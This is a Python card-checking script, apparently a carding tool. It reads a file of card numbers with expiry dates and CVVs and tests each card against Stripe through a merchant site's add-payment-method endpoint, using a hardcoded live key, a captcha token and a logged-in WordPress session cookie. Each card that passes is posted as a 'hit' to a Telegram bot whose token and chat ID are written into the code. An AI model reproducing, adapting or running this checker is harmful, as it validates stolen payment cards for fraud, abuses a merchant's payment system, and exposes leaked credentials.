try:
	import requests,re,time
	from colorama import Fore
	from bs4 import BeautifulSoup
	import pyfiglet
	import webbrowser
	import os
	import time
except ImportError:
	os.system('pip install requests')
	os.system('pip install re')
	os.system('pip install time')
	os.system('pip install colorama')
	os.system('pip install bs4')
	os.system('pip install pyfiglet')


ID = '5590831782'
tok = '7207832826:AAF1fFCe-2LZ9s82B0ZDoltLFKHIbxuzFuI'

D = '\033[2;32m'
E = '\033[2;31m'
E = '\033[2;33m'
E = '\033[2;34m'
B = '\033[2;35m'
logo = pyfiglet.figlet_format('')
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
W=Fore.WHITE
L=Fore.BLUE
print(Z+"⌧■"*30)

ascii_art = pyfiglet.figlet_format("   ChitNge HQ   ")
print(C+ ascii_art)
print(B+"⌧■"*30)
print(E+"⌧■"*30)
print(X+"⌧■"*30)

ascii_art = pyfiglet.figlet_format("   HQ Checker ")
print(X+ ascii_art)
print(F+"⌧■"*30)
webbrowser.open('https://t.me/CHITNGE54')
print('\t\033[1;31m');
print('\t\x1b[38;5;153m  ');
print(B+logo)
L = ' Download Python File Link @CHITNGE54\n'
print(D+L)
path = input(" COMBO NAME: ")
start = 0
with open(path) as file:
                lino = file.readlines()
                lino = [line.rstrip() for line in lino]
                
for e in lino:
    time.sleep(5)
    cc = e.split('|')[0]
    mm = e.split('|')[1]
    yy = e.split('|')[2][-2:]
    cvv = e.split('|')[3]
    card=e.replace('\n','')
	
    headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'save-data': 'on',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
    data = f'type=card&billing_details[name]=+&billing_details[email]=moksha0155%40gmail.com&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fb0e25b5-e4bf-435e-90ee-0945d09dd672379ee0&muid=05625395-b77b-4064-8ebb-341ad9786bae5486e1&sid=f2c5fbe2-24da-4ebc-903a-be2b6f04fff2e44e9a&payment_user_agent=stripe.js%2Fddbd33ac04%3B+stripe-js-v3%2Fddbd33ac04%3B+split-card-element&referrer=https%3A%2F%2Fgetstratos.com&time_on_page=102225&key=pk_live_505M05VOwjisZpwZeBbJj8CW00Gd7Py9iy&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiMy9uRCsvWXVObGZyMDlkRlcyZHdqYzZ1RFQzdjlqU2hzN1BsWTlLNFJjTXlpc1JrVHMzYlB0WDFBTzRscUxmYlo4SUEwTEVCSENSaWR6cElNdDZHSGpYblM3clRSSmlZckZXUHR4NmZSWTN5alIva042cjg4QWM3NzRkSzM0aXZIdEpPOEc4M0RWWjJ3bzhpbFRlTUt3bzcwbUZ4Y1FDMytQdzYrM1JoalhQTGlVM0FKUHArNzFaaHRTbS94QUYvSHVwdUNYS1FweENobCtJdVk1TjZqSHJoL05mcGd0U003QngzaDA0V3hIYjg0ZlBWbVB4SVlHNEZMVllNUXJqQ3hDMXlYL3hzd2phU1d4NlpFcmllMnFEZk1paG1mamF1VGJ3L25vTWJBNDBXc3dGcDZZWVVhbkEwMW91VnR5cDBDNjdtdlhDL0dDckZGWTVOL0M0VXJCbE13L0xta25aNHJVQ3B4ZCszQmp6WGQzbUgxZkNRZExJZldCekhscFpOSHN6bGZVdnpIeGg1L3lIWmUycVV0V3UrUWc4SWhzYmZkaEFWWDBhS0NNS0h4dlpuWmt2QzEvbTBKVmxHTTZCN0VLRWQrNXRLamh5Zkt3cjEyVjJWNFhaSnhuaVhhcm5QeFpxSkI1blZRektuOTVFeVZrRzNFUkx5ay9SWHhIRjdreUV3L1BoakdmMFlmR1h2RmNzVk14Nm11aTN1alp5NUtCbGZMeDBYZFJScTVwWk9uMVNuVmFZQmVtSlErOXp1VHJTOUF0d1M5L1N6bEZuNUF2ZkJ4ZXZwOUlpMTdBWWVia0JWdUF5Mm1qWUIycG8veHpjZkJvNEh4RHRVekxwN0dRTTRTUlVyNlQwUUZ1elpiNUhwSDBVTXJBbjJweE5TVW5RcCtxVEJpMXBlaTVwdWdQbmExQzBJck5YUEZORGRBTmpJSEtWMUFDd2hySW1jaFdncG9kem56b3RWUSt3a1F1dDZaSlR6dUFoTEJrU1Z1YVZNU1hnSEI1MVZoMFd0L3pGK0J4TllrMVNXUTZkKzJ2VzhueWN2cW5nMUdmSXNScTZJcER3dGVMQ0xOK2YyWTQ4VEtIcW1HbGt1ZEt4MHZlbGJranZrd1VnaVVHckZTejM5am1zWGJnWDhuMHRaUkJrL3BEbU9PSklWUEpDd2ZTZ3VESnFsbm5yMTc5L0o1Wk14a2U5MzZ3WXRaMS93SlRNMW1YK0RmdUtLK2kxUVE4NFhhNG5ZTmY1dkxUa21rTWxaWDJGcU1VcmVWbGJ1Qi8rR2ZBOHhMQmhWU1VkQzJ4N2RTU3JSMVNTdWhEMWVZQmRPLzNYcXlvdUtaYzh2TjR0aHhKREVwcVJJZENlMmVCdTNBQmVML0FYbEZGanZ6blM4N21ETzFLQURuckhkUVVnSkdoN2NqRGlheDhEcFEwLzNHdlFMbHowWm4yVkFaU0pwMy8rUmRLaFFUS1J4RjhvUkUwenpPVWVKN1poNFBBRGM5bTRJNEpjZk9kbjRySkNha1NpM2Z1ZUNBSGhidWIzQkhOWTQ1c0xhRnJmT1dVa01lSFRkVFJrcHZYSkNjNVpQbW1MY2xHWlZUczlGM3JUbzJ3MEpMcFhuR2xYUWlBYURyb25tSCtYbXMyb0JMYll1Mys3cHRtaldiSUdtM2w1V3h2LzBEblZvd2Y5UVd2TVcwd3pjWElFMmlHSDVVeVcxNS9kQ1lhVDluMmlCcG1sTFBCUEhGcm0rMCtDV3oxOE8vUVVVVVRWekdoVk1Oakh1dEloaURRY21Ucis1cHB3SEVmUVZDVzhXdjQwMHpTOThkMWd3Lyt0M2l4M0MvMlhuODF2Z013MGZxdlA2TnlqRWU3RU1sbzRuYkRuNUtRK1ljYTRMM2pENEhTaUNWWW5HY2c4STgyNndoK2c3N1c1cVFaSUdFMll5Qk1oR0tZMVBnZEdpbTk4b1Ewd3Z0SHhYcGpUbnl5Sk8zOE1zRWJXZkVESm1vbEJuZnhGTzVNc0w5NE9lNmgzQWFYYlVYMHNyNVg4UnhoUDA4M2NwWFltMnZRK29udklHVmR4MGhObHhhT1NjUWFTZHBoK0xkcEFKYVBjYlpFUGM0Y0VRQnlLb1dnNFc2amtyK2FUT2pZWWVwQVJVaXZGTk9MU2doc3pXc2hXd1RFbElRMzdkSDhiUHVBbXR5QlI5UnNDbzRtaHd2c0tyZmlCVG5PVW5Dd2xDSU1YaUllUUhYb052a3N4MC9ZZGNlR2V0Q05WTFY1dnB0WDExREdtZWt2NDZ6NlRmdkloMFJCV1F5Z3R3TElRMWxXeFRheWtOTW56bHo3NENtNmVJOEdFQmtkQnI3bEVKR0xNR3dmRWtQeFZsQlBwdjJlcWk0UllJZHlPaHE1R1FXMjBwYzhKcTBEdGpJcWkyZGJZK29JQTU3Z0tvalBuaTBrL1lEU0lvK1dPd3ErOXd4VDBhTzlQa3o5b0RmMTdkZnF3MUsvYzVKSXE4UWd5blRabGZnYmZBNktpL29OZ2V6MGdFTmZrMVVoY24rZzBJNW4xL0YxV01SaWVLOXg3NGJzQ0ZlQjJhUGt3MGtFLzlCNFpsaXNrNUZWYUNjdEVjMHdoVmxQMUxDK1prbDE5YXFmd3FXU0VyVlB2bTIvV085REVkTWJHQ25HNVNiaXV1RmxzN1hrV1pjVlptOVRqYndDaEoxaEFLbjZQM0orcldXM25TNGRJcDhsZjZJd3FDTjNnVHA3TFRjMHpaL2hoZGU4MFRkbUdaYkRZeWpkandhNk9EQ0hFR0FMbXE4TmN5ck9lMG5ZMk5VUCtEZjk0NVc4THBkREpUIiwiZXhwIjoxNzI0Njk0NzU0LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjNkNDQ2OGIiLCJwZCI6MCwiY2RhdGEiOiJNOXB2eVp4aFZYc2lZaHRrd1Y4amRYMk94TTJ3M3haZWM5SlBKLzVtOFpwTHNKdWM5N1lvVTZLOStZQWJZVzRtaUNvWWlocXJjeW9XVGc4OUdxZlA3aTNKeER5VFlGKzVJZnR3WlhjOXdNb2FoZDRvaHZLSUU3U0xRa21nK2tnN2Q4b1dZODNEV3F3TjZWbjRkcEhTWWxSZ0E0RDdrMmpPa3I3dmtLd0MrRTNiczRBdmRCb1N1YW5WMk9YT016S0lCdkg2Y3N1MGZMeXU1UC9WIn0.zj4mBbygaZEOL8IVkngTfoGG7DNzu2yW0mITQIcXKjo'
	
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	
    id  = (response.json()['id'])
	
    import requests
	
    cookies = {
	    '__stripe_mid': '05625395-b77b-4064-8ebb-341ad9786bae5486e1',
	    'wordpress_logged_in_3c8b2ea29a96a2948390797cd2b6c598': 'moksha0155%7C1725410261%7CnU6kLKblsVg1uqcZNJbrfS6ZKD0qnnG8sKrlPbJUzev%7C42c60ed59d32f561d4fbab5bc9f4ef01b83bd38f1ed99422b969b8ebd63c2966',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-08-26%2017%3A48%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fgetstratos.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fgetstratos.com%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_first_add': 'fd%3D2024-08-26%2017%3A48%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fgetstratos.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fgetstratos.com%2Fmy-account%2Fpayment-methods%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgetstratos.com%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_THDN1S9XWJ': 'GS1.1.1724694530.4.0.1724694530.0.0.0',
	    '_ga': 'GA1.2.1690077304.1724095222',
	    '_gid': 'GA1.2.550271184.1724694531',
	    '__stripe_sid': 'f2c5fbe2-24da-4ebc-903a-be2b6f04fff2e44e9a',
	}
	
    headers = {
	    'authority': 'getstratos.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	
	    'origin': 'https://getstratos.com',
	    'referer': 'https://getstratos.com/my-account/add-payment-method/',
	    'save-data': 'on',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
    params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
    data = {
	    'stripe_source_id': id,
	    'nonce': 'f58903dcf7',
	}
	
    response = requests.post('https://getstratos.com/', params=params, cookies=cookies, headers=headers, data=data).text
    if 'Your card could not be set up for future usag' in response:
    	print(f' {e}  ⇾ Your Card Was Declined 🚫      ')
    	
    else:
    		print(f' {e}  ⇾ CCN CHARGE 5$ ✅')
    		app = f'𝗦𝗧𝗥𝗜𝗣 𝗖𝗛𝗔𝗥𝗚𝗘   𝗛𝗶𝘁 5$ ✅\n𝗖𝗖 {e}\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 CHARGED 5$ \n𝗣𝗥𝗢𝗫𝗬 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]\n𝗕𝗢𝗧 𝗕𝗬 @Braintreexxx_bot'
    		requests.get(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={app}')
    
    
	
	
